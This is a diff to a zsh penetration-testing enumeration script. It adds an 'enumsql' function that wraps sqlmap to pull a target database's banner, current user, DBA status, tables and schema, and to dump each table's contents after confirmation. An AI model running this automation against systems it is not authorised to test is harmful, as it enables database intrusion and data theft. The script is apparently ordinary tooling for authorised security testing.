@@ -1,6 +1,6 @@
 #!/bin/zsh
 # Scripts to run a bunch of tools sequentially and automate a lot of the mindless, repetitive process of enumeration.
-# Heavy lifting done mostly by NetExec and Impacket. 
+# Heavy lifting done mostly by NetExec, Impacket and SQLMap when applicable. 
 # Copyright (C) 2024 chsoares
 # Permission to copy and modify is granted under the GNU General Public License
 # Last revised 3/2024
@@ -294,7 +294,55 @@ massmap() {
     #rm /root/scripts/masscan.tmp /root/scripts/nmap.tmp
 }
 
+#!/bin/zsh
 
+# enumsql
+# Runs sqlmap on the db to do some enumeration. 
+# Not much advantage between this and just running sqlmap other than a prettier output.
+#------------------------------------------------------------------------------------
+# Usage: enumsql target [options]
+enumsql() {
+    echo '
+                         \033[1;33m    __|   _ \   |    \033[0m
+   -_)    \   |  |   ` \ \033[1;33m  \__ \  (   |  |    \033[0m
+ \___| _| _| \_,_| _|_|_|\033[1;33m  ____/ \__\_\ ____| \033[0m
+ '                              
+
+    if [ $# -eq 0 ]; then
+        echo "\033[1;31m[!] Missing parameters. \033[0m"
+        echo "Usage: target [options]"
+        return 1
+    fi
+                                       
+    echo "\033[1;33m[!] Grabbing database banner \033[0m"
+    sqlmap $@ --banner | grep -E --color=never "technology:|DBMS:|banner:"
+    echo "\033[1;33m[!] Fetching current user \033[0m"
+    sqlmap $@ --current-user | grep -oP --color=never "(?<=current user: ').*(?=')"
+    echo "\033[1;33m[!] Is current user database admin? \033[0m"
+    sqlmap $@ --is-dba | grep -oP --color=never "(?<=DBA: ).*" | highlight red "True" 
+    echo "\033[1;33m[!] Fetching current database \033[0m"
+    sqlmap $@ --current-db | grep -oP --color=never "(?<=current database: ').*(?=')"| tee db.tmp
+    echo "\033[1;33m[!] Fetching tables \033[0m"
+    sqlmap $@ -D $(cat db.tmp) --tables | grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | tee tables.tmp
+    
+    echo "\033[1;36m[?] Retrieve tables' schema? [y/N] \033[0m"
+    read -s -q confirm
+      if [[ $confirm =~ ^[Yy]$ ]]; then    
+        echo "\033[1;33m[!] Retrieving schema \033[0m"
+        sqlmap $@ -D $(cat db.tmp) --schema | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*"
+      fi
+    
+    while read table
+      do  
+        echo "\033[1;36m[?] Do you want to dump table \"$table\"? [y/N] \033[0m"
+        read -s -q confirm
+        if [[ $confirm =~ ^[Yy]$ ]]; then    
+          echo "\033[1;33m[!] Dumping table's contents \033[0m"
+          sqlmap $@ -D $(cat db.tmp) -T $table --dump | tail -n +10 | grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | tail -n +3
+        fi
+      done < tables.tmp
+      rm tables.tmp db.tmp
+}
 
 #              _                   _          __  __ 
 #             | |                 | |        / _|/ _|
